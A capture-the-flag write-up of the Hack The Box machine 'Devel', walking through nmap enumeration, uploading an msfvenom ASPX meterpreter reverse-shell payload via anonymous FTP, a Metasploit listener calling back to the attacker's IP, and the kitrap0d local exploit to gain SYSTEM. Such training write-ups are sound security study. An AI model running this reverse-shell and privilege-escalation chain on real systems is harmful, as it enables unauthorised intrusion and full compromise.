# Devel

This is the write-up for the box Devel that got retired at the 14th October 2017.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.5    devel.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/devel.nmap 10.10.10.5
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Checking FTP (Port 21)

As anonymous login is allowed we will look through the FTP service where we find **welcome.png** and **iisstart.htm**.

## Checking HTTP (Port 80)

If we look at the image on web page we see it is called **welcome.png** which means that **iisstart.htm** is the index file and thus both services have the same root.
So when we upload something on the FTP server we can access it on the web server, too.

As this is IIS 7.5 this supports ASP and ASPX files that we will use to execute code.

### Getting a reverse shell

We will create a payload with **msfvenom** and upload the _shell.aspx_ file to the FTP server.
```markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f aspx -o shell.aspx
```

Now we can load the **Metasploit Framework** and can set up our listener:
```markdown
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.23
run
```

After starting this, it will wait for a connection. Browsing to _hxxp://10.10.10.5/shell.aspx_ activates the listener and we get a meterpreter session on the box.
Our user is _IIS Apppool\Web_ and we want to escalate our privileges by exploiting any vulnerabilities.

To identify vulnerabilites we will use the Metasploit module **post/multi/recon/local_exploit_suggester**:
```markdown
use post/multi/recon/local_exploit_suggester
set session 1
run
```

This shows us different modules to which the target is vulnerable to. In this case I am choosing **exploit/windows/local/ms10_015_kitrap0d**:
```markdown
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set LHOST 10.10.14.23
set LPORT 4445
run
```

When this finishes we get a new meterpreter session with elevated privileges. We are **NT Authority\SYSTEM** and can read all flags!

